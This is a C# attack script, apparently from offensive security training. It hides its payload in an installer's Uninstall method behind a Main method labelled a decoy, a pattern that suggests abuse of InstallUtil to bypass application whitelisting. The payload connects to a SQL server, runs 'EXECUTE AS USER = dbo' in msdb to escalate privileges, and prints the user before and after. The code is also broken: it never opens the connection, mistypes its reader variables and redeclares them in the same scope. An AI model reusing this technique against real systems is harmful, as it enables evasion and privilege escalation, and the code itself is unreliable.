using System;
using System.Data.SqlClient;

namespace ConsoleApp2
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String sqlServer = "sql07.tricky.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);
            string queryuser = "SELECT USER_NAME()";
            Console.WriteLine("before impersonation");
            SqlCommand command = new SqlCommand(queryuser, con);
            SqlCommand reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("executing in context of" + reader[0]);
            reader.Close();
            string executeas = "use msdb; EXECUTE AS USER = 'dbo';";
            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader();
            reader.Close();
            Console.WriteLine("After ipersonation");
            SqlCommand command = new SqlCommand(queryuser, con);
            SqlCommand reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("executing in context of" + reader[0]);
            con.Close();
        }
    }
}
